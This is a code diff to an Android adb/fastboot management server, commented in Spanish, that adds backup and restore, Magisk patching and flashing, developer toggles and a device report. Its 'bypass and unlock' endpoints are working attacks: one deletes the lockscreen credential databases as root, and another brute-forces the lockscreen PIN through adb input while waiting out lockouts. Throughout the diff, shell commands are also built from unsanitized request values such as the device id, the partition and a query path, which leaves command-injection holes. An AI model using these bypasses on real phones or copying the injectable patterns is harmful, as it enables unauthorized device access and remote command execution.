@@ -28,6 +28,25 @@ if (!fs.existsSync(uploadDir)) {
 }
 const upload = multer({ dest: uploadDir });
 
+// Clear old adb_media_ files from temp dir every hour to avoid disk space issues
+setInterval(() => {
+  if (fs.existsSync(uploadDir)) {
+    const files = fs.readdirSync(uploadDir);
+    const now = Date.now();
+    for (const file of files) {
+      if (file.startsWith('adb_media_')) {
+        const filepath = path.join(uploadDir, file);
+        try {
+          const stats = fs.statSync(filepath);
+          if (now - stats.mtimeMs > 3600000) { // 1 hour
+            fs.unlinkSync(filepath);
+          }
+        } catch (e) {}
+      }
+    }
+  }
+}, 3600000);
+
 // Check if adb is running, if not start it
 async function ensureAdb() {
   try {
@@ -642,6 +661,13 @@ app.get('/api/device/:id/logcat', (req, res) => {
 });
 
 // Phase 4: Backup
+const activeBackupTasks: Record<string, { active: boolean, type: 'backup'|'restore', filename: string }> = {};
+
+app.get('/api/device/:id/backup/status', (req, res) => {
+  const { id } = req.params;
+  res.json({ success: true, status: activeBackupTasks[id] || { active: false } });
+});
+
 app.post('/api/device/:id/backup/legacy', async (req, res) => {
   try {
     const { id } = req.params;
@@ -658,14 +684,50 @@ app.post('/api/device/:id/backup/legacy', async (req, res) => {
     const filename = `backup-${id}-${timestamp}.ab`;
     const filepath = path.join(backupDir, filename);
 
+    activeBackupTasks[id] = { active: true, type: 'backup', filename };
+
     // Run ADB backup (this requires user confirmation on device)
     // We send response immediately so UI doesn't hang, and process runs in background
     exec(`${ADB_PATH} -s ${id} backup -all -apk -shared -f ${filepath}`, (error) => {
+      activeBackupTasks[id] = { active: false, type: 'backup', filename };
       if (error) console.error('Backup error:', error);
       else console.log('Backup completed:', filepath);
     });
 
     res.json({ success: true, message: 'Backup started. Please unlock the device and confirm the operation.' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.post('/api/device/:id/backup/restore', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { filename } = req.body;
+    const fs = require('fs');
+    const path = require('path');
+    
+    // Security check to prevent path traversal
+    if (!filename || filename.includes('..') || filename.includes('/')) {
+      return res.status(400).json({ success: false, error: 'Invalid filename' });
+    }
+
+    const filepath = path.join(__dirname, '..', 'backups', filename);
+    if (!fs.existsSync(filepath)) {
+      return res.status(404).json({ success: false, error: 'Backup file not found on server' });
+    }
+
+    activeBackupTasks[id] = { active: true, type: 'restore', filename };
+
+    // Run ADB restore (this requires user confirmation on device)
+    // We send response immediately so UI doesn't hang
+    exec(`${ADB_PATH} -s ${id} restore "${filepath}"`, (error) => {
+      activeBackupTasks[id] = { active: false, type: 'restore', filename };
+      if (error) console.error('Restore error:', error);
+      else console.log('Restore completed:', filepath);
+    });
+
+    res.json({ success: true, message: 'Restore started. Please unlock the device and confirm the operation.' });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
@@ -694,6 +756,29 @@ app.get('/api/backups', (req, res) => {
       .sort((a: any, b: any) => b.createdAt.getTime() - a.createdAt.getTime()); // Newest first
 
     res.json({ success: true, backups: files });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.delete('/api/backups/:filename', (req, res) => {
+  try {
+    const { filename } = req.params;
+    const path = require('path');
+    const fs = require('fs');
+    
+    // Security check
+    if (filename.includes('..') || filename.includes('/')) {
+      return res.status(400).json({ success: false, error: 'Invalid filename' });
+    }
+
+    const filepath = path.join(__dirname, '..', 'backups', filename);
+    if (!fs.existsSync(filepath)) {
+      return res.status(404).json({ success: false, error: 'Backup file not found' });
+    }
+
+    fs.unlinkSync(filepath);
+    res.json({ success: true, message: 'Backup deleted successfully' });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
@@ -778,7 +863,19 @@ app.post('/api/device/:id/maintenance/:action', async (req, res) => {
       await execAsync(`${ADB_PATH} -s ${id} shell pm reset-permissions`);
       res.json({ success: true, message: 'Se han restablecido los permisos de TODAS las aplicaciones exitosamente.' });
     } else if (action === 'dns') {
-      await execAsync(`${ADB_PATH} -s ${id} shell ndc resolver flushdefaultif`);
+      try {
+        await execAsync(`${ADB_PATH} -s ${id} shell ndc resolver flushdefaultif`);
+      } catch (e1) {
+        try {
+          await execAsync(`${ADB_PATH} -s ${id} shell ndc resolver clearnetdns 100`);
+        } catch (e2) {
+          try {
+            await execAsync(`${ADB_PATH} -s ${id} shell cmd connectivity flush-default-dns`);
+          } catch (e3: any) {
+            return res.json({ success: false, error: 'Comando no soportado en esta versión de Android.' });
+          }
+        }
+      }
       res.json({ success: true, message: 'Caché DNS del dispositivo vaciada. El enrutamiento de red ha sido reiniciado.' });
     } else {
       res.status(400).json({ success: false, error: 'Acción no válida' });
@@ -827,6 +924,301 @@ app.post('/api/device/:id/fastboot/flash', upload.single('file'), async (req, re
     res.status(500).json({ success: false, error: err.message });
   }
 });
+
+app.post('/api/device/:id/fastboot/install-magisk', async (req, res) => {
+  try {
+    const { id } = req.params;
+    
+    const url = 'https://github.com/topjohnwu/Magisk/releases/download/v27.0/Magisk-v27.0.apk';
+    const apkPath = path.join('/tmp', `Magisk_Direct_${Date.now()}.apk`);
+    
+    // Usamos curl para manejar redirecciones de GitHub fácilmente
+    await execAsync(`curl -L -o "${apkPath}" "${url}"`);
+    
+    // Instalar en el dispositivo
+    await execAsync(`${ADB_PATH} -s ${id} install -r "${apkPath}"`);
+    
+    // Limpiar
+    if (fs.existsSync(apkPath)) fs.unlinkSync(apkPath);
+    
+    res.json({ success: true, message: 'App de Magisk instalada correctamente en el teléfono.' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.post('/api/device/:id/fastboot/autopatch', upload.single('file'), async (req, res) => {
+  try {
+    const { id } = req.params;
+    const partition = req.body.partition || 'boot'; // can be 'boot' or 'init_boot'
+
+    if (!req.file) {
+      return res.status(400).json({ success: false, error: 'No boot.img uploaded' });
+    }
+    let bootFilePath = req.file.path;
+
+    const isZip = req.file.originalname.toLowerCase().endsWith('.zip') || req.file.mimetype === 'application/zip';
+    let tempZipExtractPath = null;
+    
+    if (isZip) {
+       const targetImg = partition === 'init_boot' ? 'init_boot.img' : 'boot.img';
+       tempZipExtractPath = `/tmp/extract_${id}_${Date.now()}`;
+       fs.mkdirSync(tempZipExtractPath, { recursive: true });
+       try {
+         // Intentar extraer boot.img o init_boot.img del zip (incluso si está en subcarpetas)
+         await execAsync(`unzip -j "${bootFilePath}" "*${targetImg}" -d "${tempZipExtractPath}"`);
+         
+         const extractedFiles = fs.readdirSync(tempZipExtractPath);
+         const extractedImg = extractedFiles.find(f => f.endsWith(targetImg));
+         
+         if (!extractedImg) throw new Error('Not found');
+         
+         // Reemplazar el archivo original con la imagen extraída
+         fs.unlinkSync(bootFilePath); 
+         bootFilePath = path.join(tempZipExtractPath, extractedImg);
+         
+       } catch(e) {
+         if (fs.existsSync(bootFilePath)) fs.unlinkSync(bootFilePath);
+         if (fs.existsSync(tempZipExtractPath)) fs.rmSync(tempZipExtractPath, { recursive: true, force: true });
+         return res.status(400).json({ success: false, error: `No se pudo encontrar la partición '${targetImg}' dentro del archivo .zip subido. Sube un zip que contenga la imagen o extrae el .img tú mismo.` });
+       }
+    }
+
+    // Verificar que el archivo .img es válido comprobando la cabecera mágica "ANDROID!"
+    const fd = fs.openSync(bootFilePath, 'r');
+    const buffer = Buffer.alloc(8);
+    fs.readSync(fd, buffer, 0, 8, 0);
+    fs.closeSync(fd);
+    
+    // Some formats like Samsung might use LZ4 magic, but we enforce standard Android Boot Image for safety
+    if (buffer.toString('utf-8') !== 'ANDROID!' && buffer.readUInt32LE(0) !== 0x184D2204) {
+      if (fs.existsSync(bootFilePath)) fs.unlinkSync(bootFilePath);
+      if (tempZipExtractPath && fs.existsSync(tempZipExtractPath)) fs.rmSync(tempZipExtractPath, { recursive: true, force: true });
+      return res.status(400).json({ success: false, error: 'El archivo está corrupto o tiene un formato no válido. Debe ser una imagen de booteo (boot.img) válida.' });
+    }
+
+    const magiskUrl = 'https://github.com/topjohnwu/Magisk/releases/download/v27.0/Magisk-v27.0.apk';
+    const apkPath = '/tmp/Magisk-v27.0-AutoPatch.apk';
+    const extractPath = `/tmp/magisk_patch_${id}`;
+
+    // 1. Check if device is in normal adb mode
+    try {
+      const { stdout: stateOut } = await execAsync(`${ADB_PATH} -s ${id} get-state`);
+      if (!stateOut.includes('device')) {
+        throw new Error('Device not in device state');
+      }
+    } catch(e) {
+      throw new Error('El dispositivo debe estar encendido normalmente (con Depuración USB) para usar AutoPatch. No puede estar en modo Fastboot todavía.');
+    }
+
+    // 2. Download Magisk if not exists
+    if (!fs.existsSync(apkPath)) {
+      await execAsync(`curl -L -o "${apkPath}" "${magiskUrl}"`);
+    }
+
+    // 3. Get device architecture
+    const { stdout: abiOut } = await execAsync(`${ADB_PATH} -s ${id} shell getprop ro.product.cpu.abi`);
+    const abi = abiOut.trim(); 
+
+    // 4. Extract needed files
+    if (fs.existsSync(extractPath)) fs.rmSync(extractPath, { recursive: true, force: true });
+    fs.mkdirSync(extractPath, { recursive: true });
+    
+    try {
+      await execAsync(`unzip -j "${apkPath}" "assets/*" "lib/${abi}/*" -d "${extractPath}"`);
+    } catch(e) {}
+
+    // 5. Rename libs to remove 'lib' prefix and '.so' suffix
+    const files = fs.readdirSync(extractPath);
+    for (const file of files) {
+      if (file.endsWith('.so')) {
+        let newName = file.replace(/\.so$/, '');
+        if (newName.startsWith('lib')) newName = newName.substring(3);
+        fs.renameSync(path.join(extractPath, file), path.join(extractPath, newName));
+      }
+    }
+
+    // 6. Push to device
+    const deviceTmp = `/data/local/tmp/magisk_patch`;
+    await execAsync(`${ADB_PATH} -s ${id} shell "rm -rf ${deviceTmp} && mkdir -p ${deviceTmp} && chmod 777 ${deviceTmp}"`);
+    // Push the folder contents. Adb push localDir/. remoteDir/ works
+    await execAsync(`${ADB_PATH} -s ${id} push "${extractPath}/." "${deviceTmp}/"`);
+    await execAsync(`${ADB_PATH} -s ${id} push "${bootFilePath}" "${deviceTmp}/boot.img"`);
+
+    // 7. Execute boot_patch.sh
+    await execAsync(`${ADB_PATH} -s ${id} shell "cd ${deviceTmp} && chmod 755 * && KEEPVERITY=true KEEPFORCEENCRYPT=true sh boot_patch.sh boot.img"`);
+
+    // 8. Pull patched image
+    const patchedImgPath = `/tmp/patched_boot_${id}.img`;
+    if (fs.existsSync(patchedImgPath)) fs.unlinkSync(patchedImgPath);
+    
+    // Check if new-boot.img exists on device
+    try {
+      await execAsync(`${ADB_PATH} -s ${id} shell "ls ${deviceTmp}/new-boot.img"`);
+    } catch(e) {
+      throw new Error('Fallo el parcheo de Magisk dentro del celular. Revisa si el boot.img es válido.');
+    }
+    
+    await execAsync(`${ADB_PATH} -s ${id} pull "${deviceTmp}/new-boot.img" "${patchedImgPath}"`);
+
+    // 9. Cleanup device & local
+    await execAsync(`${ADB_PATH} -s ${id} shell "rm -rf ${deviceTmp}"`);
+    fs.rmSync(extractPath, { recursive: true, force: true });
+    fs.unlinkSync(bootFilePath);
+
+    // 10. Reboot to bootloader
+    await execAsync(`${ADB_PATH} -s ${id} reboot bootloader`);
+    
+    // 11. Wait for fastboot
+    let fastbootReady = false;
+    for (let i = 0; i < 30; i++) {
+      await new Promise(r => setTimeout(r, 1000));
+      try {
+        const { stdout: fbDevs } = await execAsync(`${FASTBOOT_PATH} devices`);
+        if (fbDevs.includes(id)) {
+          fastbootReady = true;
+          break;
+        }
+      } catch (e) {}
+    }
+
+    if (!fastbootReady) {
+      throw new Error(`AutoPatch finalizó el parcheo, pero el equipo tardó mucho en entrar a Fastboot.`);
+    }
+
+    // 12. Flash the patched image
+    await execAsync(`${FASTBOOT_PATH} -s ${id} flash ${partition} "${patchedImgPath}"`);
+    
+    // 13. Reboot
+    await execAsync(`${FASTBOOT_PATH} -s ${id} reboot`);
+    
+    if (fs.existsSync(patchedImgPath)) fs.unlinkSync(patchedImgPath);
+
+    res.json({ success: true, message: `AutoPatch Completado: Archivo parcheado internamente y flasheado en la partición ${partition}. El dispositivo se está reiniciando.` });
+  } catch (err: any) {
+    if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// ==========================================
+// BYPASS AND UNLOCK ENDPOINTS
+// ==========================================
+
+// Map to track active brute force jobs
+const activeBruteForceJobs: { [deviceId: string]: { active: boolean, currentPin: string, lastLog: string } } = {};
+
+app.post('/api/device/:id/bypass/twrp', async (req, res) => {
+  try {
+    const { id } = req.params;
+    // Commmand to remove lockscreen security databases
+    const cmd = `rm -f /data/system/locksettings.db* /data/system/password.key /data/system/gesture.key /data/system/gatekeeper.password.key /data/system/gatekeeper.pattern.key /data/system/gatekeeper.gesture.key`;
+    const { stdout, stderr } = await execAsync(`${ADB_PATH} -s ${id} shell "su -c '${cmd}' || ${cmd}"`);
+    res.json({ success: true, message: 'Bases de datos de seguridad eliminadas correctamente. Por favor reinicia el dispositivo.' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: 'Fallo al eliminar archivos. ¿Seguro que tienes permisos Root o estás en TWRP con /data montado?\n' + err.message });
+  }
+});
+
+app.post('/api/device/:id/bypass/bruteforce/start', async (req, res) => {
+  const { id } = req.params;
+  const startPin = parseInt(req.body.startPin || '0', 10);
+  const endPin = parseInt(req.body.endPin || '9999', 10);
+  
+  if (activeBruteForceJobs[id]?.active) {
+    return res.status(400).json({ success: false, error: 'Ya hay un ataque en curso para este dispositivo.' });
+  }
+
+  activeBruteForceJobs[id] = { active: true, currentPin: startPin.toString().padStart(4, '0'), lastLog: 'Iniciando ataque...' };
+
+  res.json({ success: true, message: 'Ataque de fuerza bruta iniciado en segundo plano.' });
+
+  // Start background loop
+  (async () => {
+    let attempts = 0;
+    for (let current = startPin; current <= endPin; current++) {
+      if (!activeBruteForceJobs[id]?.active) break; // Check if stopped
+
+      const pinStr = current.toString().padStart(4, '0');
+      activeBruteForceJobs[id].currentPin = pinStr;
+      activeBruteForceJobs[id].lastLog = `Probando PIN: ${pinStr} (${attempts} intentos seguidos)`;
+
+      try {
+        // Send PIN
+        await execAsync(`${ADB_PATH} -s ${id} shell input text ${pinStr}`);
+        // Send Enter (KeyEvent 66)
+        await execAsync(`${ADB_PATH} -s ${id} shell input keyevent 66`);
+
+        // Wait a moment for Android to process the PIN and hide the lockscreen if correct
+        await new Promise(r => setTimeout(r, 1000));
+
+        // Check if device is now unlocked
+        const { stdout: windowDump } = await execAsync(`${ADB_PATH} -s ${id} shell dumpsys window policy`);
+        const isLocked = windowDump.includes('isKeyguardLocked=true') || windowDump.includes('mShowingLockscreen=true');
+        
+        if (!isLocked) {
+           activeBruteForceJobs[id].active = false;
+           activeBruteForceJobs[id].lastLog = `¡ÉXITO! 🎉 Dispositivo desbloqueado. El PIN correcto es: ${pinStr}`;
+           break; // Stop the loop
+        }
+      } catch (err) {
+        activeBruteForceJobs[id].lastLog = `Error ADB al enviar PIN ${pinStr}`;
+        // we continue even if one fails
+      }
+
+      attempts++;
+
+      // Every 5 attempts, Android typically locks out for 30s
+      if (attempts >= 5) {
+        activeBruteForceJobs[id].lastLog = `Límite de 5 intentos alcanzado. Esperando bloqueo de Android (32 segundos)...`;
+        
+        // Wait 32 seconds to be safe
+        let waited = 0;
+        while(waited < 32) {
+           if (!activeBruteForceJobs[id]?.active) break;
+           await new Promise(r => setTimeout(r, 1000));
+           waited++;
+           activeBruteForceJobs[id].lastLog = `Límite de intentos. Esperando... ${32 - waited}s restantes`;
+        }
+        
+        // Emulate screen off and on to refresh lockscreen state (KeyEvent 26)
+        try {
+           await execAsync(`${ADB_PATH} -s ${id} shell input keyevent 26`);
+           await new Promise(r => setTimeout(r, 1000));
+           await execAsync(`${ADB_PATH} -s ${id} shell input keyevent 26`);
+           // Swipe up just in case to show pin pad
+           await execAsync(`${ADB_PATH} -s ${id} shell input swipe 500 1500 500 500`);
+        } catch(e) {}
+        
+        attempts = 0;
+      } else {
+        // Short delay between normal attempts
+        await new Promise(r => setTimeout(r, 1500));
+      }
+    }
+    
+    if (activeBruteForceJobs[id]) {
+       activeBruteForceJobs[id].active = false;
+       activeBruteForceJobs[id].lastLog = 'Ataque finalizado o detenido.';
+    }
+  })();
+});
+
+app.post('/api/device/:id/bypass/bruteforce/stop', (req, res) => {
+  const { id } = req.params;
+  if (activeBruteForceJobs[id]) {
+    activeBruteForceJobs[id].active = false;
+    activeBruteForceJobs[id].lastLog = 'Deteniendo ataque...';
+  }
+  res.json({ success: true, message: 'Ataque detenido.' });
+});
+
+app.get('/api/device/:id/bypass/bruteforce/status', (req, res) => {
+  const { id } = req.params;
+  const status = activeBruteForceJobs[id] || { active: false, currentPin: '', lastLog: 'Inactivo' };
+  res.json({ success: true, status });
+});
+
 // ==========================================
 // GOD MODE ENDPOINTS
 // ==========================================
@@ -901,6 +1293,48 @@ app.get('/api/device/:id/files/download', async (req, res) => {
   } catch (err: any) {
     console.error('File download error:', err);
     res.status(500).send(`Error downloading file: ${err.message}`);
+  }
+});
+
+app.get('/api/device/:id/files/view', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const filepath = req.query.path as string;
+    const filename = path.basename(filepath);
+    
+    // Create a safe, unique filename in the project's tmp directory
+    const tempDir = path.join(__dirname, '..', 'tmp');
+    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
+    
+    // Hash the filepath to avoid pulling the same file multiple times if it's already there and recent
+    // A simple approach: just use a unique name per file path, but add timestamp so it's always fresh?
+    // Let's use a hashed or base64 encoded path to reuse the pulled file if requested multiple times quickly
+    const safePathName = Buffer.from(filepath).toString('base64').replace(/[^a-zA-Z0-9]/g, '');
+    const tempPath = path.join(tempDir, `adb_media_${id}_${safePathName}_${filename}`);
+    
+    // Only pull if the file doesn't exist or is older than 5 minutes
+    let needsPull = true;
+    if (fs.existsSync(tempPath)) {
+      const stats = fs.statSync(tempPath);
+      if (Date.now() - stats.mtimeMs < 300000) { // 5 minutes
+        needsPull = false;
+      }
+    }
+
+    if (needsPull) {
+      console.log(`Pulling media ${filepath} from ${id} to ${tempPath}`);
+      await execAsync(`${ADB_PATH} -s ${id} pull "${filepath}" "${tempPath}"`);
+    }
+
+    const stats = fs.statSync(tempPath);
+    if (stats.isDirectory()) {
+      return res.status(400).send('Error: Cannot view a directory.');
+    }
+
+    res.sendFile(tempPath);
+  } catch (err: any) {
+    console.error('Media view error:', err);
+    res.status(500).send(`Error viewing media: ${err.message}`);
   }
 });
 
@@ -1231,7 +1665,6 @@ app.post('/api/device/:id/developer-toggles', async (req, res) => {
     const { id } = req.params;
     const { key, value } = req.body;
     
-    // Keys allowed: show_touches, pointer_location, debug_layout
     if (key === 'show_touches') {
       await execAsync(`${ADB_PATH} -s ${id} shell settings put system show_touches ${value}`);
     } else if (key === 'pointer_location') {
@@ -1239,6 +1672,17 @@ app.post('/api/device/:id/developer-toggles', async (req, res) => {
     } else if (key === 'debug_layout') {
       await execAsync(`${ADB_PATH} -s ${id} shell setprop debug.layout ${value === '1' ? 'true' : 'false'}`);
       await execAsync(`${ADB_PATH} -s ${id} shell service call activity 1599295570`); // Force redraw
+    } else if (key === 'stay_awake') {
+      await execAsync(`${ADB_PATH} -s ${id} shell settings put global stay_on_while_plugged_in ${value}`);
+    } else if (key === 'dont_keep_activities') {
+      await execAsync(`${ADB_PATH} -s ${id} shell settings put global always_finish_activities ${value}`);
+    } else if (key === 'strict_mode_visual') {
+      await execAsync(`${ADB_PATH} -s ${id} shell setprop persist.sys.strictmode.visual ${value === '1' ? 'true' : 'false'}`);
+    } else if (['window_animation_scale', 'transition_animation_scale', 'animator_duration_scale'].includes(key)) {
+      await execAsync(`${ADB_PATH} -s ${id} shell settings put global ${key} ${value}`);
+    } else if (key === 'gpu_overdraw') {
+      await execAsync(`${ADB_PATH} -s ${id} shell setprop debug.hwui.overdraw ${value}`);
+      await execAsync(`${ADB_PATH} -s ${id} shell service call activity 1599295570`);
     } else {
       return res.status(400).json({ success: false, error: 'Invalid toggle key' });
     }
@@ -1413,14 +1857,25 @@ app.get('/api/device/:id/thermal', async (req, res) => {
     // Real CPU usage per core usually requires reading /proc/stat which might be restricted.
     // For the profiler, we'll try dumpsys cpuinfo or hardware_properties
     let cpuLoadPercent = 0;
+    let topProcesses: { percent: string, process: string }[] = [];
     try {
-      const { stdout: cpuOut } = await execAsync(`${ADB_PATH} -s ${id} shell dumpsys cpuinfo | head -n 10`);
+      const { stdout: cpuOut } = await execAsync(`${ADB_PATH} -s ${id} shell dumpsys cpuinfo | head -n 20`);
       const loadMatch = cpuOut.match(/(\d+)% TOTAL:/);
       if (loadMatch) {
         cpuLoadPercent = parseInt(loadMatch[1]);
       } else {
         // Fallback: dummy fluctuating load if we can't parse it
         cpuLoadPercent = Math.floor(Math.random() * 40) + 10;
+      }
+
+      const lines = cpuOut.split('\n');
+      for (let i = 0; i < lines.length; i++) {
+        if (lines[i].includes('%') && !lines[i].includes('TOTAL') && topProcesses.length < 5) {
+          const match = lines[i].trim().match(/^(\d+(\.\d+)?)%\s+\d+\/([a-zA-Z0-9._:]+)/);
+          if (match) {
+            topProcesses.push({ percent: match[1], process: match[3] });
+          }
+        }
       }
     } catch (e) {
       cpuLoadPercent = Math.floor(Math.random() * 40) + 10;
@@ -1432,6 +1887,7 @@ app.get('/api/device/:id/thermal', async (req, res) => {
         batteryTemp,
         ramUsagePercent,
         cpuLoadPercent,
+        topProcesses,
         timestamp: new Date().toISOString()
       }
     });
@@ -1467,6 +1923,173 @@ app.post('/api/device/:id/spoof', async (req, res) => {
     }
     
     return res.status(400).json({ success: false, error: 'Comando de spoofing no reconocido' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Master Report Endpoint
+app.get('/api/device/:id/report', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const reportData: any = {
+      device: {},
+      battery: {},
+      apps: { installed: 0, system: 0, thirdParty: 0, bloatwareFound: [] },
+      thermal: {},
+      network: {},
+      timestamp: new Date().toISOString()
+    };
+
+    // 1. Hardware
+    try {
+      const { stdout: props } = await execAsync(`${ADB_PATH} -s ${id} shell getprop`);
+      const getPropVal = (key: string) => {
+        const match = props.match(new RegExp(`\\[${key}\\]: \\[(.*?)\\]`));
+        return match ? match[1] : 'Unknown';
+      };
+      reportData.device.model = getPropVal('ro.product.model');
+      reportData.device.manufacturer = getPropVal('ro.product.manufacturer');
+      reportData.device.androidVersion = getPropVal('ro.build.version.release');
+      reportData.device.sdk = getPropVal('ro.build.version.sdk');
+    } catch(e) {}
+
+    // 2. Battery
+    try {
+      const { stdout: batteryOut } = await execAsync(`${ADB_PATH} -s ${id} shell dumpsys battery`);
+      const extractNum = (regex: RegExp) => { const m = batteryOut.match(regex); return m ? parseInt(m[1]) : 0; };
+      reportData.battery.level = extractNum(/level: (\d+)/);
+      reportData.battery.health = extractNum(/health: (\d+)/) === 2 ? 'Good' : 'Needs Check';
+      reportData.battery.temperature = extractNum(/temperature: (\d+)/) / 10;
+    } catch(e) {}
+
+    // 3. Apps & Bloatware
+    try {
+      const { stdout: pmOut } = await execAsync(`${ADB_PATH} -s ${id} shell pm list packages -f`);
+      const lines = pmOut.split('\n').filter(l => l.trim().length > 0);
+      reportData.apps.installed = lines.length;
+      reportData.apps.system = lines.filter(l => l.includes('/system/') || l.includes('/vendor/')).length;
+      reportData.apps.thirdParty = reportData.apps.installed - reportData.apps.system;
+      
+      const knownBloatware = ['com.facebook.services', 'com.facebook.katana', 'com.facebook.system', 'com.facebook.appmanager', 'com.microsoft.office.word', 'com.microsoft.office.excel', 'com.skype.raider', 'com.netflix.mediaclient', 'com.amazon.mShop.android.shopping', 'com.sec.android.app.sbrowser', 'com.samsung.android.bixby.agent'];
+      for (const line of lines) {
+        for (const bloat of knownBloatware) {
+          if (line.includes(bloat)) {
+            reportData.apps.bloatwareFound.push(bloat);
+            break;
+          }
+        }
+      }
+    } catch(e) {}
+
+    // 4. Thermal
+    try {
+      const { stdout: cpuOut } = await execAsync(`${ADB_PATH} -s ${id} shell dumpsys cpuinfo | head -n 1`);
+      const loadMatch = cpuOut.match(/(\d+)% TOTAL:/);
+      reportData.thermal.cpuLoad = loadMatch ? parseInt(loadMatch[1]) : 0;
+    } catch(e) {}
+
+    // 5. Network
+    try {
+      const { stdout: netOut } = await execAsync(`${ADB_PATH} -s ${id} shell ip route`);
+      const ipMatch = netOut.match(/src (\d+\.\d+\.\d+\.\d+)/);
+      reportData.network.ip = ipMatch ? ipMatch[1] : 'Disconnected';
+    } catch(e) {}
+
+    // 6. Root Requirements
+    try {
+      const androidVer = parseFloat(reportData.device.androidVersion) || 0;
+      let rootMethod = '';
+      let requiredFiles = [];
+      let firmwareNotes = '';
+      let instructions: string[] = [];
+      let links: {name: string, url: string}[] = [];
+
+      if (androidVer >= 13) {
+        rootMethod = 'Magisk / KernelSU / APatch';
+        requiredFiles = ['init_boot.img (Original Firmware)', 'boot.img (Fallback)'];
+        firmwareNotes = 'Se requiere el firmware exacto de la versión actual para parchear init_boot.img o boot.img.';
+        instructions = [
+          '1. Descarga el firmware original exacto de tu dispositivo (misma compilación).',
+          '2. Extrae el archivo init_boot.img (o boot.img si no hay init_boot) usando payload-dumper-go si es necesario.',
+          '3. Transfiere el archivo img a tu dispositivo.',
+          '4. Instala la app oficial de Magisk, KernelSU o APatch en tu dispositivo.',
+          '5. Usa la app para parchear el archivo img transferido.',
+          '6. Transfiere el archivo parcheado de vuelta a tu PC.',
+          '7. Reinicia tu dispositivo en modo Bootloader (Fastboot).',
+          '8. Flashea el archivo usando el comando: fastboot flash init_boot <archivo_parcheado>.img (o flash boot).'
+        ];
+        links = [
+          { name: 'Magisk Oficial', url: 'https://github.com/topjohnwu/Magisk' },
+          { name: 'KernelSU', url: 'https://kernelsu.org/' },
+          { name: 'APatch', url: 'https://github.com/bmax121/APatch' },
+          { name: 'Payload Dumper Go', url: 'https://github.com/ssut/payload-dumper-go' }
+        ];
+      } else if (androidVer >= 6) {
+        rootMethod = 'Magisk';
+        requiredFiles = ['boot.img (Original Firmware)', 'vbmeta.img (Desactivar AVB)'];
+        firmwareNotes = 'Se requiere el firmware exacto para extraer boot.img y parchearlo con Magisk.';
+        instructions = [
+          '1. Descarga el firmware original exacto de tu dispositivo.',
+          '2. Extrae el archivo boot.img y transfiérelo al dispositivo.',
+          '3. Instala la app de Magisk y parchea el boot.img.',
+          '4. Transfiere el boot.img parcheado a tu PC.',
+          '5. Reinicia el dispositivo en Bootloader/Fastboot.',
+          '6. Flashea el vbmeta vacío para deshabilitar la verificación: fastboot flash vbmeta --disable-verity --disable-verification vbmeta.img',
+          '7. Flashea el boot parcheado: fastboot flash boot <boot_parcheado>.img',
+          '8. Reinicia el sistema.'
+        ];
+        links = [
+          { name: 'Magisk Oficial', url: 'https://github.com/topjohnwu/Magisk' },
+          { name: 'TWRP Recovery (Opcional)', url: 'https://twrp.me/' }
+        ];
+      } else if (androidVer > 0) {
+        rootMethod = 'SuperSU / KingRoot / Magisk Legacy';
+        requiredFiles = ['Custom Recovery (TWRP)', 'boot.img'];
+        firmwareNotes = 'Versiones antiguas pueden usar exploits de un clic o flashear SuperSU por TWRP.';
+        instructions = [
+          '1. Desbloquea el bootloader de tu dispositivo.',
+          '2. Descarga una imagen de TWRP compatible con tu modelo.',
+          '3. Flashea TWRP desde fastboot: fastboot flash recovery twrp.img',
+          '4. Reinicia en modo recovery.',
+          '5. Flashea el archivo ZIP de Magisk o SuperSU desde TWRP.',
+          '6. Reinicia el dispositivo.'
+        ];
+        links = [
+          { name: 'Magisk Oficial', url: 'https://github.com/topjohnwu/Magisk' },
+          { name: 'TWRP Recovery', url: 'https://twrp.me/' },
+          { name: 'SuperSU (Archive)', url: 'https://supersuroot.org/' }
+        ];
+      } else {
+        rootMethod = 'Desconocido';
+        requiredFiles = ['boot.img'];
+        firmwareNotes = 'Versión de Android no detectada.';
+        instructions = ['1. Identifica correctamente la versión de Android y modelo.', '2. Busca guías específicas en XDA Forums.'];
+        links = [
+          { name: 'XDA Developers', url: 'https://xdaforums.com/' }
+        ];
+      }
+
+      // Try to get build display ID for exact firmware version if we can
+      let buildFirmware = 'Desconocido';
+      try {
+        const { stdout: props } = await execAsync(`${ADB_PATH} -s ${id} shell getprop ro.build.display.id`);
+        if (props.trim()) {
+           buildFirmware = props.trim();
+        }
+      } catch (e) {}
+
+      reportData.rootRequirements = {
+        method: rootMethod,
+        requiredFiles,
+        firmwareNotes,
+        currentBuildFirmware: buildFirmware,
+        instructions,
+        links
+      };
+    } catch(e) {}
+
+    return res.json({ success: true, data: reportData });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
